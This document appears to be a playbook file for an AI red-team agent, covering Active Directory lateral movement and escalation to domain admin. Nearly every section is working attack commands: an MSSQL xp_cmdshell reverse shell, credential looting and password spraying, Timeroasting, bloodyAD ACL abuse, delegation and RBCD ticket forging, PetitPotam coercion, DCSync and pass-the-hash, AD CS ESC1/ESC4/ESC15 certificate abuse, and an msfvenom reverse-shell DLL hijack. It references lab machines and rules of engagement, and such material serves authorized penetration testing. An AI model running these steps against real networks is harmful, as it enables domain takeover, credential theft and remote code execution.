---
name: playbook-ad-lateral-delegation
description: Active Directory lateral movement + privilege escalation via MSSQL linked servers + xp_cmdshell RCE, foothold credential-looting and single-password reuse-spray, Kerberos delegation (unconstrained/constrained/RBCD), authentication coercion, cross-forest trusts, Timeroasting, DACL abuse (bloodyAD — AddSelf/ForceChangePassword/WriteOwner→GenericAll/Protected-Users removal), WriteSPN targeted-Kerberoasting, gMSA password read, deleted-object recovery, AD CS ESC1/ESC4/ESC15, and DCSync. Load when you have domain creds or a foothold on a Windows/AD network (network/red-team lane). Payloads defer to redteam_tool_guide / the network lane.
prerequisite: A domain credential (user:pass / NT hash / ccache) OR a shell on a domain-joined Windows host. This is the network/red-team lane — evidence is the operator log, not a Burp logger_index.
stop_condition: A DA/enterprise-admin equivalent is reached (DCSync of krbtgt, or Administrator hash), OR two enumeration passes (BloodHound + service enum) yield no delegation / linked-server / trust / dangerous-ACL edge → record what you mapped and pivot host or vector.
---

# AD Lateral Movement + Delegation Playbook

Load when: you hold domain creds or a Windows foothold and want to move laterally / escalate to DA. Burp-blind — record every step with `record_redteam_action`, loot with `record_loot`, forward with `sync_to_ghostwriter`. Cite operator-log ids.

## SMART MOVE — first three actions

1. **Sync the clock, then collect BloodHound** (Kerberos rejects >5-min skew):
   ```
   sudo ntpdate <dc-ip>            # or: sudo rdate -n <dc-ip>
   nxc ldap <dc-ip> -u <user> -p '<pass>' --bloodhound -c All --dns-server <dc-ip>
   ```
2. **Ingest the graph into Praetor** — `sync_bloodhound_to_ghostwriter(domain, "<bh.zip>")`. The parser flags the crown-jewel edges this playbook chains: **trusts** (cross-forest), **delegation** (unconstrained/constrained), **DCSync**, **AD CS ESC**, and **dangerous ACLs**. Work them worst-first.
3. **Enumerate the services that carry lateral paths** — `run_network_recon(<dc-ip>, creds="DOM/user:pass")` routes SMB/LDAP/**MSSQL**/Kerberos. Watch for leads: `mssql_link`, `unconstrained_deleg`, `domain_trust`.

## §1 MSSQL lateral movement (linked servers + impersonation)

Authenticated MSSQL is a top lateral vector — a linked server often lands you as the SQL service account (e.g. `svc_sql`) on another host.
```
mssqlclient.py 'DOM/user:pass@<ip>' -windows-auth
SQL> enum_links                       # linked servers + the login they run as
SQL> EXECUTE AS LOGIN = 'sa'          # or enum_impersonate then impersonate
SQL> SELECT * FROM OPENQUERY([LINK], 'SELECT @@version')
SQL> EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LINK]
```
Enable exec on the instance you control: `enable_xp_cmdshell` then `xp_cmdshell "powershell -e <b64 revshell>"` (SOC-loud; catch on a listener). `mssql_priv` (nxc `-M mssql_priv`) auto-checks impersonation + xp_cmdshell. Record the shell host + service account.

## §1a Loot creds on the foothold → reuse-spray (the pivot multiplier)

A shell or a readable share is a credential source before it is anything else. AD boxes chain by finding one account's secret in a file and reusing it to become a *different*, higher-value account (EscapeTwo: `sa` password in a share → MSSQL RCE → `sql-Configuration.INI` yields a service password → spray → lands `ryan`).

- **Hunt config/secret files** — from a shell (`xp_cmdshell`, WinRM, SMB): `sql-Configuration.INI` / `*.config` / `web.config` / `unattend.xml` / `*.ps1` / `Groups.xml` (cpassword) / `.git-credentials`; `findstr /si password *.ini *.xml *.config *.txt` (Windows), `xp_dirtree` to map the SQL install dir. Every discovered secret → `record_credential(domain, user, secret, secret_type="password")` and `record_loot`.
- **Readable SMB shares** hold spreadsheets/docs with creds: `nxc smb <dc> -u <u> -p '<pw>' --shares` (find READ), then `smbclient`/`nxc smb --get-file`. A "corrupted" `.xlsx`/`.docx` is a ZIP — `unzip -o file.xlsx` and grep `sharedStrings.xml` / `xl/` for plaintext (repairing the magic bytes also works, but the ZIP dump is faster).
- **Reuse-spray the looted password across every enumerated user** — this is credential *reuse*, not a dictionary brute (Rule 6 permits it): build `users.txt` from `--users` / the looted doc, then `nxc smb <dc> -u users.txt -p '<looted-pw>' --continue-on-success`. A hit on a new user is the pivot. `--local-auth` to spray local accounts. Validate WinRM access with `nxc winrm` before reaching for `evil-winrm`.

## §1b Kerberos-only domains (NTLM disabled)

Some DCs disable NTLM — every tool needs `-k`. Set up the realm once:
```
nxc smb <dc-ip> --generate-hosts-file ./hosts     # add to /etc/hosts
nxc smb <dc-ip> --generate-krb5-file ./krb5.conf && sudo cp ./krb5.conf /etc/krb5.conf
sudo ntpdate <dc-ip>                               # clock skew breaks Kerberos
nxc smb <dc-ip> -u <user> -p '<pass>' -k           # validate (–k = Kerberos)
```
Then `getTGT.py 'dom/user:pass'` → `KRB5CCNAME=user.ccache <impacket-tool> -k -no-pass`, and `evil-winrm -i dc -r <realm>` with a loaded ccache.

## §1c Timeroasting (computer-account password recovery, unauth)

`Timeroasting` abuses the DC's signed NTP response: the MAC is derived from a computer account's NT hash and the DC never authenticates the NTP request, so any RID's MAC is retrievable and crackable offline. Manually-set / stale machine passwords fall.
```
nxc smb <dc-ip> -M timeroast                        # dump <RID>:$sntp-ms$... lines
crack_hashes(domain, "timeroast", loot_type="timeroast_hash")   # hashcat -m 31300
```
Resolve the cracked RID to a computer account in BloodHound (RID 1125 → `IT-COMPUTER3$`). A weak machine password is a full AD credential — often one with an abusable ACL edge (§1d). Tell-tale in BloodHound: `pwdlastset` ≫ `whencreated` on a computer = manually set (autogenerated machine passwords are set at creation and rotate every 30 days).

## §1d DACL / ACL abuse chain (bloodyAD)

BloodHound flags the edges (`ingest_bloodhound` surfaces `dangerous_acl` — AddSelf / ForceChangePassword / GenericAll / GenericWrite / AddAllowedToAct). `bloodyAD` is the exploitation Swiss-army knife (prefix `bloodyAD --host dc.dom.htb -d dom.htb -u <u> -p <pw> --kerberos`):
```
bloodyAD ... get writable                               # what you can edit
bloodyAD ... add groupMember HelpDesk 'IT-COMPUTER3$'   # AddSelf -> inherit HelpDesk rights
bloodyAD ... set password bb.morgan 'Password123!'      # ForceChangePassword
```
**Protected Users blocker:** a reset user in `Protected Users` cannot use NTLM / weak etypes / delegation and rejects your forged auth. If you have write over the group, lift it, then re-request the TGT:
```
bloodyAD ... remove groupMember 'Protected Users' bb.morgan
getTGT.py 'dom/bb.morgan:Password123!'                  # now succeeds
KRB5CCNAME=bb.morgan.ccache evil-winrm -i dc -r dom.htb # if the user has WinRM rights
```
No WinRM rights on the reset user? Pivot execution context on a host you already control with `RunasCs.exe <user> <pass> <cmd>` (see `redteam_tool_guide("runascs")`).

More edges the parser flags as `dangerous_acl` and how to abuse them:
- **WriteSPN** (targeted Kerberoast): `targetedKerberoast.py -d dom.htb -u <you> -p <pw> --request-user <target>` → `$krb5tgs$` → `crack_hashes(domain, "kerberoast")`. Manual: `bloodyAD ... set object <target> servicePrincipalName <fake/spn>` → GetUserSPNs → unset.
- **WriteOwner → GenericAll** chain: `bloodyAD ... set owner <target> <you>` → `bloodyAD ... add genericAll <target> <you>` → `bloodyAD ... set password <target> <pw>`. Owning an object lets you grant yourself full control, then reset it.
- **ReadGMSAPassword** (group grants read of a gMSA): join the group if you can (`add groupMember`), then `bloodyAD ... get object '<gmsa$>' --attr msDS-ManagedPassword` (or `gMSADumper.py`, `nxc ldap --gmsa`) → the service-account NT hash → authenticate with `-H <nt>` / `-k`. Then pivot as the service account (often it holds ForceChangePassword / delegation rights).

### Deleted / tombstoned object recovery (AD Recycle Bin)
A `GenericAll`/`GenericWrite` edge over an object that isn't in the live directory usually means it's soft-deleted but restorable — restore it, then abuse the ACL:
```
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * | fl Name,ObjectGUID,DistinguishedName
Restore-ADObject -Identity <object-guid>
rpcclient <dc> -U 'dom\you' -c "setuserinfo <restored> 23 <NewPass!>"   # or bloodyAD set password
```
(Restore needs `Reanimate-Tombstones`/GenericWrite on the deleted-objects container or the object; `bloodyAD` can also search `--include-deleted`.)

## §2 Kerberos delegation abuse

`findDelegation.py 'DOM/user:pass'@<dc>` (or the BloodHound `delegation` edges).

### Unconstrained delegation (the DarkZero DC02 primitive) — CRITICAL
A host with unconstrained delegation caches the TGT of any principal that authenticates to it. **Coerce a DC to authenticate, capture its TGT, DCSync.**
1. On the unconstrained host, watch for tickets: `Rubeus.exe monitor /interval:10 /nowrap` (Windows) or `krbrelayx.py` (from Kali, with the host account key).
2. Coerce the DC to auth to your host — any of:
   - **MSSQL** (if a SQL service runs on the DC): `xp_dirtree \\<your-host>\x` — forces the DC's SQL process to request `cifs/<your-host>`, carrying the DC TGT.
   - **PetitPotam.py** `<your-host> <dc-ip>` (MS-EFSRPC), **printerbug.py** (MS-RPRN), **dfscoerce.py**, **coercer**.
3. Capture the base64 TGT → ticket pipeline (§3) → DCSync (§4).

### Constrained delegation / RBCD — HIGH
- Constrained (`msDS-AllowedToDelegateTo`): `getST.py -spn <target-spn> -impersonate administrator -altservice cifs 'DOM/svc:pass'` → ccache for the target service as Administrator.
- **RBCD** — you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target (a `GenericAll` / `GenericWrite` / `WriteAccountRestrictions` / **`AddAllowedToAct`** ACL edge, e.g. via a `DelegationManager`-style group over the DC object). Set a controlled computer account (or a Timeroasted machine account) as the allowed principal, then S4U-impersonate:
  ```
  bloodyAD ... add rbcd DC$ 'IT-COMPUTER3$'          # or: Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount 'IT-COMPUTER3$'
  getST.py 'dom/IT-COMPUTER3$:<pw>' -k -spn cifs/dc.dom.htb -impersonate backupadmin
  ```
  **Target selection — check `AccountNotDelegated`:** an account with `AccountNotDelegated=True` (often `Administrator`) CANNOT be impersonated via any delegation. Pick a high-value account with the flag `False` (e.g. `BackupAdmin`): `Get-ADUser <u> -Properties AccountNotDelegated`. Then use the ticket:
  ```
  KRB5CCNAME=backupadmin@cifs_DC...ccache wmiexec.py -k -no-pass 'dom/backupadmin@dc.dom.htb'
  KRB5CCNAME=backupadmin@cifs_DC...ccache secretsdump.py -k -no-pass 'dom/backupadmin@dc.dom.htb'   # DCSync -> Administrator hash + plaintext
  ```

## §3 Ticket conversion pipeline (kirbi ⇄ ccache)

```
echo "<base64-ticket>" > ticket.b64
base64 -d ticket.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi dc01.ccache
nxc smb <dc> -u <user> -p '<pass>' --generate-krb5-file ./krb5.conf
export KRB5_CONFIG=./krb5.conf
export KRB5CCNAME=dc01.ccache
klist                                  # confirm the ticket is loaded
```
Now every impacket tool runs with `-k -no-pass`.

## §4 DCSync + Pass-the-Hash/Ticket

With a DC machine ticket (or DCSync rights):
```
secretsdump.py -k -no-pass -dc-ip <dc> DOM/'DC01$'@dc01.domain      # dump all hashes incl. krbtgt
```
Then reuse the Administrator NT hash:
```
evil-winrm -i <dc> -u Administrator -H <nt-hash>
psexec.py -hashes :<nt-hash> Administrator@<dc>
```
Record the hashes with `record_loot(domain, "ntlm_hash", ...)`; `crack_hashes` is unnecessary once you have the hash (PtH directly).

## §4b AD CS abuse (certipy — ESC1 / ESC15)

`ingest_bloodhound` also parses certipy `find -json` into `adcs_esc` edges. Enumerate then exploit:
```
certipy-ad find -u <user> -p <pw> -dc-ip <dc> -vulnerable -stdout
```
- **ESC1** (enrollee supplies subject + client-auth EKU): `certipy req -u <u> -p <pw> -ca '<CA>' -template <t> -upn administrator@dom -sid <domainSID>-500` → `certipy auth -pfx administrator.pfx -dc-ip <dc>` → Administrator NT hash. The `-sid ...-500` is mandatory.
- **ESC4 → ESC1** (you have write/`GenericAll`/`WriteOwner`→`GenericAll` over a *template*, not the CA — the EscapeTwo path: `ryan` WriteOwner over `ca_svc`, reset it, and `ca_svc` can edit the `DunderMifflinAuthentication` template). Rewrite the template's config into a permissive ESC1 shape, then exploit it as ESC1:
  ```
  certipy template -u ca_svc@dom -p '<pw>' -template <t> -write-default-configuration -save-old \
      -target <dc-fqdn> -target-ip <dc-ip>          # -save-old backs up the original -> restore after (OPSEC)
  certipy req -u ca_svc@dom -p '<pw>' -ca '<CA>' -template <t> -upn administrator@dom -sid <domainSID>-500
  certipy auth -pfx administrator.pfx -dc-ip <dc>   # -> Administrator NT hash -> PtH (§4)
  ```
  Pass `-target`/`-target-ip` whenever certipy throws DNS errors resolving the DC FQDN — the `/etc/hosts` entry is not always honoured. Restore the template afterward with the `-save-old` backup.
- **ESC15 / EKUwu** (CVE-2024-49019, a schema-v1 template such as `WebServer`): inject a client-auth application policy the template doesn't grant:
  ```
  certipy-ad req -u <u> -p <pw> -dc-ip <dc> -target <dc-fqdn> -ca '<CA>' -template WebServer \
      -application-policies 'Client Authentication' -upn Administrator@dom
  certipy-ad auth -pfx administrator.pfx -dc-ip <dc> -ldap-shell    # then: add_user_to_group <you> 'Domain Admins'
  ```
  The `-ldap-shell` route adds yourself to Domain/Enterprise Admins directly (useful when PKINIT-to-NT-hash is blocked). See `redteam_tool_guide("certipy")`.

## §5 Cross-forest / cross-domain trusts

BloodHound `trust` edges + `nltest /domain_trust /server:<host>` confirm direction. A **bidirectional** trust means a ticket from one forest is honoured by the other — the lateral bridge (DarkZero DARKZERO.EXT ⇄ DARKZERO.HTB). If **SID filtering is disabled** (parent/child, or misconfigured forest trust), inject an extra-SID for privileged cross-domain access:
```
raiseChild.py <child-dom>/<user>:<pass>                 # parent/child auto-escalation
ticketer.py -nthash <krbtgt> -domain-sid <child-sid> -extra-sid <ent-admins-sid> -domain <child> Administrator
```

## §6 Local privesc on a foothold host (bridge to root/SYSTEM)

When you land as a low-priv service account (svc_sql) on a member/DC:
- Fingerprint: `systeminfo` / OS build. Map to a kernel/authz CVE with `lookup_cve` — e.g. **CVE-2024-30088** (Windows Kernel token/authz privesc, Server 2019/2022) → SYSTEM. Verify the build matches before firing (offsets differ per build).
- **Writable COM CLSID → DLL hijack** (lateral to whoever triggers a shell extension). If your group has Full Control over a CLSID's `InprocServer32` key (find shell-extension handlers: `reg query HKCR\CLSID /s /f "zip"`; check the ACL with `Get-Acl "HKLM:\SOFTWARE\Classes\CLSID\{...}\InprocServer32"`), repoint it to a malicious DLL:
  ```
  msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=<ip> LPORT=9001   # or a benign proof DLL under RoE
  Set-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\ProgramData\shell.dll"
  ```
  Any user who invokes that context-menu/shell action (e.g. 7-Zip's) loads your DLL in THEIR context — code execution as a different, often higher-priv user (`rlwrap nc -nlvp 9001`). This is a user-context pivot, not a direct SYSTEM path.
- Then continue from the new context: RBCD/delegation (§2), machine-account abuse, or DCSync (§4).

## Evidence + Praetor integration

- Coercion / ticket / DCSync step → `record_redteam_action(domain, tool=..., command=..., target=<host>)`. ATT&CK auto-tags: unconstrained/S4U→T1558, coercion→T1187 (Forced Authentication), MSSQL link→T1210, trust→T1482, SID-history→T1134.005.
- Hashes / tickets → `record_loot(domain, "ntlm_hash"|"kerberos_ticket", ...)`. Reuse via `list_credentials` → `run_network_recon(<next-host>, creds=...)`.
- Forward the kill chain: `sync_bloodhound_to_ghostwriter(domain, <bh.zip>)` (attack-path edges) + `sync_to_ghostwriter(domain)` (operator-log timeline + findings).

## Tools

`redteam_tool_guide(tool="mssqlclient" | "rubeus" | "petitpotam" | "krbrelayx" | "ticketconverter" | "certipy" | "bloodyad" | "rusthound-ce")`. Enum: `rusthound-ce` / `bloodhound-python` / `nxc --bloodhound -c All`, `findDelegation.py`, `nltest`, `nxc -M timeroast`. DACL abuse: `bloodyAD` (add/remove groupMember, set owner+genericAll, set password, add rbcd, --attr msDS-ManagedPassword). WriteSPN: `targetedKerberoast`. gMSA: `gMSADumper` / `nxc --gmsa`. ADCS: `certipy` (ESC1/ESC15). Coercion: PetitPotam / printerbug / dfscoerce / coercer. Tickets: Rubeus (on-host) / krbrelayx (Kali) → ticketConverter → impacket `-k`. Cracking: `crack_hashes(domain, "timeroast"|"asrep"|"kerberoast"|"ntlm")`.
